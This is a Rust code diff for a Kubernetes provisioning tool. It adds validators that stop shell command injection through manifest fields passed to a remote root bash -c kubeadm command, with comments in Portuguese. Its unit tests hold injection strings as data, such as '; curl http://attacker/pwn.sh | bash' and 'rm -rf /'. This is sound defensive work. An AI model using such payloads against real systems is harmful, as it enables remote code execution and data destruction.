@@ -81,6 +81,36 @@ fn default_service_subnet() -> String {
     "10.96.0.0/12".to_string()
 }
 
+/// `host[:porta]` — só o alfabeto de um hostname/IPv4/IPv6 + porta. Recusa
+/// vazio e qualquer coisa que comece por `-`/`:` (evita ambiguidade com
+/// flags). **Crítico para segurança**: este valor entra directamente num
+/// `format!` que vira o CORPO de um comando `bash -c` remoto (`kubeadm
+/// init --control-plane-endpoint=...`, ver `kubeadm_init`/`kubeadm_join`) —
+/// sem esta validação, um manifesto malicioso injecta comandos arbitrários
+/// como root no host remoto (`;`/`` ` ``/`$()`/`|` não são bloqueados por
+/// `remote::shell_quote`, que só protege a fronteira ssh→bash-c local, não o
+/// CONTEÚDO do script). Achado de auditoria de segurança, ver CLAUDE.md.
+fn valid_endpoint(s: &str) -> bool {
+    !s.is_empty()
+        && !matches!(s.chars().next(), Some('-') | Some(':'))
+        && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | ':'))
+}
+
+/// CIDR simples (`10.244.0.0/16`) — só dígitos/`.`/`/`. Mesma justificação
+/// de segurança de [`valid_endpoint`] (usado em `--pod-network-cidr`/
+/// `--service-cidr` do `kubeadm init`).
+fn valid_cidr(s: &str) -> bool {
+    !s.is_empty() && s.chars().all(|c| c.is_ascii_digit() || matches!(c, '.' | '/'))
+}
+
+/// Versão do Kubernetes (`1.31` ou `1.31.2`) — só dígitos/`.`. Mesma
+/// justificação de segurança de [`valid_endpoint`] (usado em
+/// `--kubernetes-version` do `kubeadm init` E no repositório apt de
+/// `k8s_recipes::k8s_host_recipes`, corrido em TODOS os hosts).
+pub(crate) fn valid_version(s: &str) -> bool {
+    !s.is_empty() && s.chars().all(|c| c.is_ascii_digit() || c == '.')
+}
+
 fn validate(spec: &ClusterSpec) -> Result<()> {
     if spec.etcd.mode != "stacked" {
         return Err(Error::Invalid(format!(
@@ -98,6 +128,27 @@ fn validate(spec: &ClusterSpec) -> Result<()> {
              precisa de um endpoint estável — LB/VIP — à frente deles; não inventamos um)"
                 .into(),
         ));
+    }
+    if let Some(ep) = &spec.control_plane_endpoint {
+        if !valid_endpoint(ep) {
+            return Err(Error::Invalid(format!("spec.controlPlaneEndpoint '{ep}' inválido (só host/IP[:porta])")));
+        }
+    }
+    if !valid_cidr(&spec.pod_subnet) {
+        return Err(Error::Invalid(format!("spec.podSubnet '{}' inválido (formato CIDR esperado)", spec.pod_subnet)));
+    }
+    if !valid_cidr(&spec.service_subnet) {
+        return Err(Error::Invalid(format!("spec.serviceSubnet '{}' inválido (formato CIDR esperado)", spec.service_subnet)));
+    }
+    if let Some(v) = &spec.k8s_version {
+        if !valid_version(v) {
+            return Err(Error::Invalid(format!("spec.k8sVersion '{v}' inválido (só dígitos e pontos, ex.: '1.31')")));
+        }
+    }
+    for h in spec.control_plane.iter().chain(spec.workers.iter()) {
+        if !valid_endpoint(&h.ip) {
+            return Err(Error::Invalid(format!("host '{}' tem ip inválido: '{}'", h.label(), h.ip)));
+        }
     }
     Ok(())
 }
@@ -327,6 +378,72 @@ Then you can join any number of worker nodes by running the following on each as
 kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
 	--discovery-token-ca-cert-hash sha256:1111111111111111111111111111111111111111111111111111111111111111
 ";
+
+    #[test]
+    fn valid_endpoint_aceita_host_ip_e_porta() {
+        assert!(valid_endpoint("10.0.0.10"));
+        assert!(valid_endpoint("10.0.0.10:6443"));
+        assert!(valid_endpoint("lb.exemplo.com"));
+        assert!(valid_endpoint("cp1"));
+    }
+
+    #[test]
+    fn valid_endpoint_recusa_injeccao_de_comandos() {
+        assert!(!valid_endpoint("10.0.0.10; curl http://attacker/pwn.sh | bash; #"));
+        assert!(!valid_endpoint("$(curl http://attacker/pwn.sh)"));
+        assert!(!valid_endpoint("`whoami`"));
+        assert!(!valid_endpoint("10.0.0.10 && rm -rf /"));
+        assert!(!valid_endpoint(""));
+        assert!(!valid_endpoint("-oProxyCommand=x"));
+    }
+
+    #[test]
+    fn valid_cidr_aceita_formato_normal_e_recusa_injeccao() {
+        assert!(valid_cidr("10.244.0.0/16"));
+        assert!(!valid_cidr("10.244.0.0/16; rm -rf /"));
+        assert!(!valid_cidr(""));
+    }
+
+    #[test]
+    fn valid_version_aceita_formato_normal_e_recusa_injeccao() {
+        assert!(valid_version("1.31"));
+        assert!(valid_version("1.31.2"));
+        assert!(!valid_version("1.31; curl evil|bash; #"));
+        assert!(!valid_version("1.31\ncurl evil|bash\n#"));
+        assert!(!valid_version(""));
+    }
+
+    #[test]
+    fn validate_recusa_endpoint_malicioso_no_manifesto_completo() {
+        let spec = ClusterSpec {
+            ssh: SshSpec { user: "delonix".into(), key: None },
+            etcd: EtcdSpec::default(),
+            control_plane_endpoint: Some("10.0.0.10; curl http://attacker/pwn.sh | bash; #".into()),
+            control_plane: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
+            workers: vec![],
+            k8s_version: None,
+            pod_subnet: default_pod_subnet(),
+            service_subnet: default_service_subnet(),
+        };
+        let err = validate(&spec).unwrap_err();
+        assert!(format!("{err}").contains("controlPlaneEndpoint"));
+    }
+
+    #[test]
+    fn validate_recusa_k8s_version_maliciosa() {
+        let spec = ClusterSpec {
+            ssh: SshSpec { user: "delonix".into(), key: None },
+            etcd: EtcdSpec::default(),
+            control_plane_endpoint: None,
+            control_plane: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
+            workers: vec![],
+            k8s_version: Some("1.31; curl evil|bash #".into()),
+            pod_subnet: default_pod_subnet(),
+            service_subnet: default_service_subnet(),
+        };
+        let err = validate(&spec).unwrap_err();
+        assert!(format!("{err}").contains("k8sVersion"));
+    }
 
     #[test]
     fn parse_join_info_extrai_token_hash_e_certificate_key() {
